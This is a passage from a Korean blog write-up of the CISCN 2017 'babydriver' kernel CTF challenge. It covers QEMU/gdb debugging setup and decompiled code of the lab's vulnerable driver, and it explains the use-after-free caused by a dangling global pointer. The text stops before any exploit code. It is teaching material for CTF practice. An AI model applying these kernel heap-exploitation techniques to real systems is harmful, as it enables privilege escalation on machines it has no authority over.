<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <!-- hexo-inject:begin --><script src='https://unpkg.com/echarts@3.3.2/dist/echarts.min.js'></script><!-- hexo-inject:end --><meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <meta http-equiv="Cache-Control" content="no-siteapp">
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
  <meta name="renderer" content="webkit">
  <meta name="naver-site-verification" content="e19266ac7916f4f7f8ebeef5355bdce5102d3416">

  
  <title>CISCN 2017 babydriver Write-Up (linux kernel UAF) | Defenit 블로그</title>

  <link rel="shortcut icon" href="/images/favicon.png">
  <link rel="alternate" href="/rss2.xml" title="Defenit 블로그">
  <meta name="description" content="목차 서론 환경 설정 qemu 설치 문제 파일 압축 해제 boot.sh 수정 extract-vmlinux   문제 분석 함수 분석 취약점 체이닝   cred exploit tty_struct exploit Reference    서론문제 파일 : babydriver.zip CICSN 2017 CTF의 babydriver 문제를 풀어보도록 하겠습니다. 해당">
<meta name="keywords" content="Defenit, Hacking, Securify, Exploit, Kernel, Research, Web, Reversing, CTF">
<meta property="og:type" content="article">
<meta property="og:title" content="CISCN 2017 babydriver Write-Up (linux kernel UAF)">
<meta property="og:url" content="https://defenit.kr/2019/10/18/Pwn/ㄴ WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/index.html">
<meta property="og:site_name" content="Defenit 블로그">
<meta property="og:description" content="목차 서론 환경 설정 qemu 설치 문제 파일 압축 해제 boot.sh 수정 extract-vmlinux   문제 분석 함수 분석 취약점 체이닝   cred exploit tty_struct exploit Reference    서론문제 파일 : babydriver.zip CICSN 2017 CTF의 babydriver 문제를 풀어보도록 하겠습니다. 해당">
<meta property="og:locale" content="en">
<meta property="og:image" content="https://user-images.githubusercontent.com/42788779/66922671-79a79d80-f062-11e9-8c9d-9131342b2fd9.png">
<meta property="og:updated_time" content="2019-10-18T12:44:08.179Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CISCN 2017 babydriver Write-Up (linux kernel UAF)">
<meta name="twitter:description" content="목차 서론 환경 설정 qemu 설치 문제 파일 압축 해제 boot.sh 수정 extract-vmlinux   문제 분석 함수 분석 취약점 체이닝   cred exploit tty_struct exploit Reference    서론문제 파일 : babydriver.zip CICSN 2017 CTF의 babydriver 문제를 풀어보도록 하겠습니다. 해당">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/42788779/66922671-79a79d80-f062-11e9-8c9d-9131342b2fd9.png">

  <meta name="format-detection" content="telephone=no,email=no">
  <meta name="theme-color" content="#9C27B0">
  <meta name="description" content="Team Defenit Blog">
  <meta name="keywords" content>

  <meta name="mobile-web-app-capable" content="yes">
  <meta name="application-name" content="Defenit 블로그">
  <meta name="msapplication-starturl" content="https://defenit.kr/2019/10/18/Pwn/ㄴ WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/">
  <meta name="msapplication-navbutton-color" content="#9C27B0">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-title" content="Defenit 블로그">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <link rel="apple-touch-icon" href="/images/favicon.png">

  
    <meta property="article:published_time" content="Fri Oct 18 2019 21:26:00 GMT+0900">
    <meta property="article:modified_time" content="Fri Oct 18 2019 21:44:08 GMT+0900">
  

  
    <link rel="canonical" href="https://defenit.kr/2019/10/18/Pwn/ㄴ WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/">
  

  <meta name="google-site-verification" content="Zw9X-H7aB3j4IjiTtdPzc5YXGbBCqAe65ysy9o2dOL8">
  

  
  
  

  <link rel="stylesheet" href="/css/mdui.css">
<link rel="stylesheet" href="/css/style.css"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body class="mdui-appbar-with-toolbar mdui-drawer-body-left mdui-theme-primary-indigo mdui-theme-accent-pink">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script>var a=localStorage.getItem("mdui-theme-layout-dark");if(a){document.getElementsByTagName("body")[0].className+=" mdui-theme-layout-dark"};</script>
  <header id="header" class="mdui-appbar mdui-appbar-fixed mdui-appbar-scroll-hide mdui-appbar-inset">
  <div class="mdui-toolbar mdui-color-theme">
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-drawer="{target: '#sidebar', swipe: true}"><i class="mdui-icon material-icons">menu</i></a>
    <a href="/" class="mdui-typo-headline">Defenit 블로그</a>
    <div class="mdui-toolbar-spacer"></div>
    <a href="javascript:;" class="mdui-btn mdui-btn-icon" mdui-dialog="{target: '#search'}" mdui-tooltip="{content: '검색'}"><i class="mdui-icon material-icons">search</i></a>
    <a href="/rss2.xml" class="mdui-btn mdui-btn-icon" mdui-tooltip="{content: 'RSS'}"><i class="mdui-icon material-icons">rss_feed</i></a>
  </div>
</header>
<div class="mdui-dialog" id="search">
  
    <div class="search-form">
      <input type="search" class="search-form-input" placeholder="입력">
    </div>
    <div class="search-result" data-resource="/search.xml"></div>
  
</div>
  <aside id="sidebar" class="mdui-drawer mdui-drawer-full-height">
  <div class="mdui-grid-tile">
    <img src="/images/banner.png" style="height: 160px;">
    <img src="/images/avatar.png" class="avatar-animation" style="position: absolute; top: 10%; left: 24px; width: 64px; height: 64px; border: 2px solid #fff; border-radius: 50%;">
    <div class="mdui-grid-tile-actions">
      <div class="mdui-grid-tile-text">
        <div class="mdui-grid-tile-title">Defenit</div>
        <div class="mdui-grid-tile-subtitle"><i class="mdui-icon material-icons">art_track</i></div>
      </div>
      
    </div>
  </div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    <a href="/" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-blue">home</i>
      <div class="mdui-list-item-content">Home</div>
    </a>
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-green">chrome_reader_mode</i>
        <div class="mdui-list-item-content">카테고리</div>
        <i class="mdui-collapse-item-arrow mdui-icon material-icons">keyboard_arrow_down</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense"><hr>
	   <h3>
        <a class="mdui-ripple sidebar_archives-link" href="/categories/Crypto/">Crypto<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Crypto/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Forensic/">Forensic<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Forensic/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/">Pwn<span class="mdui-ripple sidebar_archives-count">5</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">3</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Pwn/ㄴ-WriteUps/">ㄴ WriteUps<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Rev/">Rev<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Rev/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">1</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/">Web<span class="mdui-ripple sidebar_archives-count">3</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/ㄴ-Research/">ㄴ Research<span class="mdui-ripple sidebar_archives-count">2</span></a><a class="mdui-ripple sidebar_archives-link" href="/categories/Web/ㄴ-WriteUps/">ㄴ WriteUps<span class="mdui-ripple sidebar_archives-count">1</span></a></h3> <hr>
		
        
      </div>
    </div>
    </div>
    <a href="https://www.notion.so/j0n9hyun/4f40ecc7ba7241168f3bd41de0206e24?v=3b0cdd48c6c446098517cc8e8d0bf0fc" class="mdui-list-item mdui-ripple">
      <i class="mdui-list-item-icon mdui-icon material-icons mdui-text-color-purple">person</i>
      <div class="mdui-list-item-content">팀정보</div>
    </a>
  </div>

  <div class="mdui-divider"></div>

  <div class="mdui-list" mdui-collapse="{accordion: true}">
    
      <a href="https://blog.naver.com/yjw_sz/221631615816" class="mdui-list-item mdui-ripple">Apply</a>
    
    <div class="mdui-collapse-item">
      <div class="mdui-collapse-item-header mdui-list-item mdui-ripple">
        <div class="mdui-list-item-content">Links</div>
        <i class="mdui-list-item-icon mdui-icon material-icons">link</i>
      </div>
      <div class="mdui-collapse-item-body mdui-list mdui-list-dense">
        
          <a href="https://ctf.j0n9hyun.xyz/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">Wargame</a>
        
          <a href="https://www.facebook.com/Defenit-260502217757766/" target="_blank" class="mdui-list-item mdui-ripple mdui-p-l-2 mdui-text-color-theme-accent" style="justify-content: center;">Facebook</a>
        
        
      </div>
    </div>
  </div>
</aside>

  <main id="main" class="mdui-m-t-5 fadeIn animated">
  <link rel="stylesheet" href="https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css">
  <style>#main article .mdui-card-content .center-block{display:block!important;margin-right:auto!important;margin-left:auto!important}</style>
  <article class="mdui-card mdui-m-b-5">
    <header class="mdui-card-media">
      <img src="/images/random/cover.png" style="max-height: 340px;">
      <div class="mdui-card-media-covered">
        <div class="mdui-card-primary">
          <div class="mdui-card-primary-title">CISCN 2017 babydriver Write-Up (linux kernel UAF)</div>
          <div class="mdui-card-primary-subtitle"><i class="iconfont">&#xe697;</i> 2019-10-18 / <i class="iconfont">&#xe601;</i> V4bel</div>
        </div>
      </div>
      <div class="mdui-card-menu">
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#qrcode', align: 'right'}"><i class="mdui-icon material-icons">devices</i></button>
          <ul class="mdui-menu" id="qrcode">
            
              <li class="mdui-menu-item"><a class="mdui-text-center mdui-ripple">Send to mobile phone</a></li>
            
            <li class="mdui-menu-item" disabled>
              
                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQ4AAAEOCAAAAABd2qZ5AAADf0lEQVR42u3awY4iMQwE0Pn/n969joRgq5wYWOn1CTHQnTwONbH988f16/pBgAMHDhw4cODAgQPHF3P8xNfvzyd3ePz84+vHuz17Sv6tfC84cODAgWOP4x9R9GQbzzbfvhPF4ZOf4WQvOHDgwIFjm6MNy9f3aWP4NV8LVDwRBw4cOHB8lCM/yLV8t97BgQMHDhz/F0de1MuPWHnczoqPOHDgwIHjUxwnhbl6jKAsGrZB+6ZaKQ4cOHDguDrQ8J2vPzbfgQMHDhw41q5kZCE/IibtpaPV4sCBAweOqxz5UPWt4ex8e7PIzwuFOHDgwIFjm+P1125F3WuU2Thdfv8iaHHgwIEDx4gjX1D+mHZs7ryx1MYwDhw4cODY42jDdTuMkxGHfCXRiAMOHDhw4HgLRxu0bemw/Una4YajthMOHDhw4DgeaMjjbXZkOgnpIjJvjcrhwIEDB45LHG3prX0nL0FG7aLRgB0OHDhw4NjmaAcazptSJ9Hebn7YdsKBAwcOHJc6+AlQPtBQlOfKJ+Ybjj6DAwcOHDgWOGYlv/NNthGbN6uKyMeBAwcOHFc5Zse5vMDXBufGs+q2Ew4cOHDgWONoF91+MvkBZmN8OHDgwIHjsxztw9o73Cr8nbe4oiMcDhw4cOA44Jg94Lxp1B7ekvdna8CBAwcOHNscr2+XjKkNl1W2l5JRORw4cODA8X6ONkSjQ1FMlgdnMn4xLHfiwIEDB46rHMkDZkE7i9I2LFsgHDhw4MCxzZEvfW/coR2wu/UaBw4cOHDsceTLSkqK53E4G9pO/gnAgQMHDhzbHHfjbVZqPGlotc0zHDhw4MCxzXE3btujVF6O3IhhHDhw4MCxwVHHUvzX2WhCvskWtBhowIEDBw4cyxznC20PbG3QtqvCgQMHDhzv58jjMPl8Uuxrx/XyJ14IWhw4cODAMeI4j8/Z8Fx+ULzVasKBAwcOHHsc7XVyPGtbRHfDGwcOHDhwvIejDaqTY1jbiMrHKY5aWThw4MCBY4FjtujX98nj8+Ru+Xqe3hkHDhw4cKxxnDSTzst/J3E+O1jiwIEDB45v4yhaO8FC7wZ8cQccOHDgwPFRjiRcZ+MRbYurLSauHOFw4MCBA8dxcTCJzyT8ToYSok3m38WBAwcOHAsc7UDDbKxhdszb+BYOHDhw4NjjcOHAgQMHDhw4cODAgePLrr9KEckqESAXyQAAAABJRU5ErkJggg==">
              
            </li>
          </ul>
        
        
          <button class="mdui-btn mdui-btn-icon mdui-text-color-white" mdui-menu="{target: '#share_menu', align: 'right'}"><i class="mdui-icon material-icons">share</i></button>
          <ul class="mdui-menu" id="share_menu">
            <li class="mdui-menu-item">
              <a href="https://www.facebook.com/sharer/sharer.php?u=https://defenit.kr/2019/10/18/Pwn/ㄴ WriteUps/CISCN-2017-babydriver-Write-Up-linux-kernel-UAF/" target="_blank" class="mdui-ripple">페이스북 공유</a>
            </li>
          </ul>
        
      </div>
    </header>
    <div class="mdui-card-content mdui-typo">
      <h2 id="목차"><a href="#목차" class="headerlink" title="목차"></a>목차</h2><ul>
<li>서론</li>
<li>환경 설정<ul>
<li>qemu 설치</li>
<li>문제 파일 압축 해제</li>
<li>boot.sh 수정</li>
<li>extract-vmlinux</li>
</ul>
</li>
<li>문제 분석<ul>
<li>함수 분석</li>
<li>취약점 체이닝</li>
</ul>
</li>
<li>cred exploit</li>
<li>tty_struct exploit</li>
<li>Reference</li>
</ul>
<hr>

<h2 id="서론"><a href="#서론" class="headerlink" title="서론"></a>서론</h2><p>문제 파일 : <a href="https://github.com/scwuaptx/Pwngdb/files/3743877/babydriver.zip" target="_blank" rel="noopener">babydriver.zip</a></p>
<p>CICSN 2017 CTF의 babydriver 문제를 풀어보도록 하겠습니다.</p>
<p>해당 문제는 linux kernel 문제이며 User-After-Free 취약점이 발생하는 모듈이 등록되어 있습니다.</p>
<p>크게 두 가지 정도의 방법으로 exploit 할 수 있으며 이번 글에서 두 방법 모두 작성해보겠습니다.</p>
<p>kernel exploit을 처음 시작하는 분도 쉽게 이해할 수 있도록 최대한 세부적으로 작성했습니다.</p>
<hr>

<h2 id="환경-설정"><a href="#환경-설정" class="headerlink" title="환경 설정"></a>환경 설정</h2><h3 id="qemu-설치"><a href="#qemu-설치" class="headerlink" title="qemu 설치"></a>qemu 설치</h3><p>커널 디버깅을 하는 방법은 매우 다양합니다. VMware &lt;-&gt; gdb 나 VMware &lt;-&gt; IDA 등등 여러가지 방법이 있지만, 여기서는 qemu와 gdb를 사용하여 디버깅을 해보겠습니다.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu</span><br></pre></td></tr></table></figure></p>
<p>문제를 푸는데 사용할 가상 머신인 qemu는 위의 명령어로 설치할 수 있습니다.</p>
<h3 id="문제-파일-압축-해제"><a href="#문제-파일-압축-해제" class="headerlink" title="문제 파일 압축 해제"></a>문제 파일 압축 해제</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver ls</span><br><span class="line">boot.sh  bzImage  rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>문제 파일의 압축을 풀면 위와 같은 파일들이 있습니다.</p>
<ol>
<li><code>boot.sh</code> : qemu의 실행 옵션이 들어있는 쉘 스크립트</li>
<li><code>bzImage</code> : 빌드된 커널 이미지 파일</li>
<li><code>rootfs.cpio</code> : 파일 시스템</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver mkdir baby</span><br><span class="line">➜  babydriver cp rootfs.cpio baby</span><br><span class="line">➜  babydriver cd baby</span><br><span class="line">➜  baby ls</span><br><span class="line">rootfs.cpio</span><br><span class="line">➜  baby mv rootfs.cpio rootfs.gz</span><br><span class="line">➜  baby gzip -d rootfs.gz</span><br><span class="line">➜  baby cpio -id -v &lt; rootfs</span><br><span class="line">.</span><br><span class="line">etc</span><br><span class="line">etc/init.d</span><br><span class="line">etc/passwd</span><br><span class="line">etc/group</span><br><span class="line">bin</span><br><span class="line">bin/su</span><br><span class="line">bin/grep</span><br><span class="line">bin/watch</span><br><span class="line">bin/stat</span><br><span class="line">bin/df</span><br><span class="line">bin/ed</span><br><span class="line">bin/mktemp</span><br><span class="line">bin/mpstat</span><br><span class="line">......</span><br><span class="line">home</span><br><span class="line">home/ctf</span><br><span class="line">5556 blocks</span><br><span class="line">➜  baby ls</span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs  sbin  sys  tmp  usr</span><br></pre></td></tr></table></figure>
<p>위 처럼 <code>rootfs.cpio</code>의 압축을 풀어주면 파일 시스템들을 구할 수 있습니다.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/modules/4.4.72/</span><br></pre></td></tr></table></figure>
<p>exploit을 진행할 취약점이 있는 모듈인 <code>babydriver.ko</code> 파일은 위의 경로에 있습니다.</p>
<h3 id="boot-sh-수정"><a href="#boot-sh-수정" class="headerlink" title="boot.sh 수정"></a>boot.sh 수정</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver cat boot.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos;-enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<p>다시 돌아와서 <code>boot.sh</code> 파일을 보면 위와 같은데, 중요한 옵션의 뜻은 다음과 같습니다.</p>
<ol>
<li><code>-enable-kvm</code> : qemu-kvm 사용</li>
<li><code>-m 64M</code> : 메모리 64M 할당</li>
<li><code>+smep</code> : SMEP 보호기법 적용</li>
</ol>
<p><img width="600" alt="vmware" src="https://user-images.githubusercontent.com/42788779/66922671-79a79d80-f062-11e9-8c9d-9131342b2fd9.png"></p>
<p>qemu-kvm을 사용하므로 VMware의 옵션에 들어가서 Intel Vt-x/EPT 기능을 켜주셔야 합니다. macOS의 VMware Fusion 기준으로 “vmware 설정 -&gt; Processors &amp; Memory -&gt; 고급 옵션”에 해당 설정이 있습니다.</p>
<p><code>boot.sh</code> 스크립트를 실행했을 때 kernel panic이 뜰 경우, 해당 스크립트의 메모리 할당을 <code>-m 256M</code> 옵션으로 고쳐 램을 추가 할당해주시면 됩니다.</p>
<p>gdb로 해당 커널을 디버깅 하기 위해 <code>boot.sh</code> 스크립트에 <code>-s</code> 옵션을 붙여서 <code>1234</code> 포트를 열어주셔야 합니다.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -s -initrd rootfs.cpio -kernel bzImage -append &apos;console=ttyS0 root=/dev/ram oops=panic panic=1&apos;-enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<p>최종적으로 위처럼 수정하시면 됩니다.</p>
<h3 id="extract-vmlinux"><a href="#extract-vmlinux" class="headerlink" title="extract-vmlinux"></a>extract-vmlinux</h3><p>마지막으로는 디버깅을 용이하게 해주는 <code>vmlinux</code> 파일을 구할 차례입니다. 커널 컴파일 과정 중 <code>vmlinux</code> 파일에서 Instruction set을 뽑아낸 것이 바로 <code>bzImage</code> 커널 이미지입니다.<br><code>extract-vmlinux</code> 스크립트를 이용하면 역으로 <code>bzImage</code>를 <code>vmlinux</code> 파일로 변환할 수 있습니다.</p>
<p>일반적으로 <code>vmlinux</code> 파일에는 심볼과 유용한 가젯들이 살아있어서 이를 이용하면 커널 디버깅을 좀 더 수월하게 할 수 있습니다.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install linux-headers-$(uname -r)</span><br><span class="line">/usr/src/linux-headers-$(uname -r)/scripts/extract-vmlinux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<p>위의 명령어를 통해 <code>bzImage</code>를 <code>vmlinux</code> 파일로 변환할 수 있습니다.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  babydriver file vmlinux</span><br><span class="line">vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=e993ea9809ee28d059537a0d5e866794f27e33b4, stripped</span><br></pre></td></tr></table></figure>
<p>생성된 <code>vmlinux</code> 파일을 살펴보면 알 수 있다시피 ELF type인 것을 볼 수 있습니다.<br>사실, 이렇게 생성된 <code>vmlinux</code>는 정상적인 커널 빌드 과정에서 생성되는 <code>vmlinux</code>와 다르게 심볼이 없는 stripped 상태입니다.</p>
<p>심볼들은 <code>/boot/System.map-*</code> 파일을 통해 mapping 할 수 있으나 babydriver 문제에서는 user 권한으로 <code>/proc/kallsyms</code> 파일에서 심볼을 뽑아낼 수 있으므로 넘어가겠습니다.</p>
<p>(만약 user 권한으로 proc/kallsyms를 읽어 올 수 없을 경우, 파일 시스템 안의 <code>init</code>파일을 수정해서 root 권한으로 심볼을 뽑아내도 됩니다.)</p>
<hr>

<h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="함수-분석"><a href="#함수-분석" class="headerlink" title="함수 분석"></a>함수 분석</h3><p>취약점이 있는 디바이스 모듈인 <code>babydriver.ko</code> 파일을 디컴파일하면 다음과 같습니다.</p>
<h5 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen()"></a>babyopen()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928L</span>L, <span class="number">64L</span>L);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>babyopen()</code> 함수는 해당 디바이스가 <code>open()</code> 되었을 때 실행되는 함수입니다.<br>구조체 <code>babydev_struct</code>의 첫 번째 멤버인 <code>device_buf</code>에 64byte 만큼의 heap 영역을 할당한 뒤 그 주소를 저장합니다.<br>두 번째 멤버인 <code>device_buf_len</code>에는 할당된 heap 영역의 크기인 64를 저장합니다.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)</span><br><span class="line">00000000                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line">00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r</span><br><span class="line">00000000                                         ; babyopen+26/w ... ; offset</span><br><span class="line">00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w</span><br><span class="line">00000008                                         ; babyioctl+3C/w ...</span><br><span class="line">00000010 babydevice_t    ends</span><br></pre></td></tr></table></figure>
<p><code>babydev_struct</code>는 위와 같은 구조를 가지고 있으며, <strong>전역 변수</strong> 로 선언되어 있습니다.</p>
<h5 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl()"></a>babyioctl()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">65537</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">37748928L</span>L);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>만약 전달 받은 두 번째 인자가 <code>65537</code>일 경우 기존에 <code>device_buf</code> 멤버에 저장된 heap 영역 주소를 해제합니다. 그리고 <code>device_buf</code>와 <code>device_buf_len</code>를 <code>arg</code> 기준으로 새로 할당, 저장합니다.</p>
<h5 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease()"></a>babyrelease()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">"device release\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>babyrelease()</code>는 해당 디바이스를 <code>close()</code>할 경우 호출되는 함수입니다.<br><code>device_buf</code> 멤버에 저장된 주소를 해제합니다.</p>
<p><code>babyioctl()</code>함수와 다르게 <code>babydev_sturct</code> 구조체의 멤버들을 새로 저장하지 않습니다.<br>즉, heap 할당을 관리하는 구조체가 해제된 포인터를 가르키게 됩니다. <strong>(dangling pointer)</strong></p>
<h5 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite()"></a>babywrite()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span 